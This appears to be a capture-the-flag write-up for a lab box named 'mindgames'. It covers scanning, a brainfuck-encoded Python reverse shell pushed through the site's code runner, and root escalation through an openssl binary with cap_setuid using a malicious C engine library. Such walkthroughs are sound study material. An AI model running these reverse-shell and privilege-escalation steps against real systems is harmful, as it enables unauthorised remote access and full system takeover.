> No hints. Hack it. Don't give up if you get stuck, enumerate harder
___
- running an initial nmap ```nmap -sV IP -v``` scan I foud ports `80` and `22` open 
- navigating to the webpage, there were a couple of code snippets to run, the and the coding language was brainfuck
- decoding the brainfuck code samples, I found they were written in python (ex// print('Hello, World')
- I used this python code for a reverse shell:
```python
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR IP",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
- pasted it into a brainfuck code generator, and pasted the generated code into the website
- running a listener on my attacking machine `nc -lvnp 7777` I got a reverse shell
```
$ whoami
mindgames

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
mindgames@mindgames:~/webserver$
```
- I CDed into `mindgames` home directory, which is where I found `user.txt` 
- going up the parent home directory, I found one other user, tryhackme
```
mindgames@mindgames:/home$ ls
mindgames  tryhackme
```
- in order to escalate to root, I would usually use commands such as `sudo -l` but since this is a reverse shell and I don't have a password, we're going to need a different method
- the one hint is to enumerate harder, so I decided against bruteforcing ssh passwords
- instead I CDed back into `/webserver` in mindgames home directory (spoiler alert, don't follow the next like 5 steps they did nothing)
```
mindgames@mindgames:~/webserver$ ls -la
ls -la
total 7032
drwxrwxr-x 3 mindgames mindgames    4096 May 11  2020 .
drwxr-xr-x 6 mindgames mindgames    4096 May 11  2020 ..
drwxrwxr-x 2 mindgames mindgames    4096 May 11  2020 resources
-rwxrwxr-x 1 mindgames mindgames 7188315 May 11  2020 server
```
- the resources folder contained the index stysheet and js code, all of which are accessible from the webpage itself so I didn't bother investigating those through the shell
- instead I focused on the gigantic server file
```
mindgames@mindgames:~/webserver$ file server
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, not stripped
```
- yay...
- transfered the files over
```python3
mindgames@mindgames:~/webserver$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

mymachine > wget http://10.10.24.153:8000/server
```
- running file on my attack machine, it showed the build id which seemed a bit unusual
```
└─$ file server
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=6eWZXU8dxYsVcbX8M-_t/L7HAoBGFkn5le6fY7orV/EsVJ-L3djclt6TZ91pnM/Yqf5bdBbhM5qHpYIoY3Y, not stripped
```
- I used `readelf -a server` to analyze the file further, and found this string at the bottom
```
description data: 36 65 57 5a 58 55 38 64 78 59 73 56 63 62 58 38 4d 2d 5f 74 2f 4c 37 48 41 6f 42 47 46 6b 6e 35 6c 65 36 66 59 37 6f 72 56 2f 45 73 56 4a 2d 4c 33 64 6a 63 6c 74 36 54 5a 39 31 70 6e 4d 2f 59 71 66 35 62 64 42 62 68 4d 35 71 48 70 59 49 6f 59 33 59
```
- decoding it, i found that it was identical to the build id `6eWZXU8dxYsVcbX8M-_t/L7HAoBGFkn5le6fY7orV/EsVJ-L3djclt6TZ91pnM/Yqf5bdBbhM5qHpYIoY3Y`
- the functions section was veryyyy long with a ton of potentially interesting request and commands, but I found the flag sections interesting
```
5822: 00000000004c52e0   121 FUNC    GLOBAL DEFAULT    1 flag.(*intValue).Set
  5823: 00000000004c5360    83 FUNC    GLOBAL DEFAULT    1 flag.(*intValue)[...]
  5824: 00000000004c53c0   121 FUNC    GLOBAL DEFAULT    1 flag.(*int64Valu[...]
  5825: 00000000004c5440    92 FUNC    GLOBAL DEFAULT    1 flag.(*int64Valu[...]
  5826: 00000000004c54a0   121 FUNC    GLOBAL DEFAULT    1 flag.(*uintValue).Set
  ... [ ETC ] ...
```
- i'm not very good at reverse engineering, so it was looking like running the file was my only real option (which i didn't really want to do but wtv)
```
└─$ ./server       
2024/03/02 21:41:00 Listening for requests
```
- at this point I started to think this was the wrong rabbithole to be going down (I was right)
- the python server messed up the shell so I respawned it and decided to search for other methods of priv escalation
```shell
# find suids
find / -user root -perm -u=s 2>/dev/null
```
- this didn't return anything interesting, so I decided to finally give in and just use linpeas, which foud an `openssl` vulnerability
```
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```
- now we generate c code to exploit this (this is the contents of shell.c)
```c
#include <unistd.h>

__attribute__((constructor))
static void init() {
    setuid(0);
    execl("/bin/sh", "sh", NULL);
}
```
- compiled it, transfered it to the reverse shell using a python server (see semi useless steps above if you don't know how to do that)
```
gcc -fPIC -o shell.o -c shell.c
gcc -shared -o shell.so -lcrypto shell.o
```
- then I ran it on the reverse shell
```
mindgames@mindgames:~$ chmod +x shell.so 
mindgames@mindgames:~$ openssl req -engine ./shell.so
root@mindgames:~# cat /root/root.txt
```
- done!
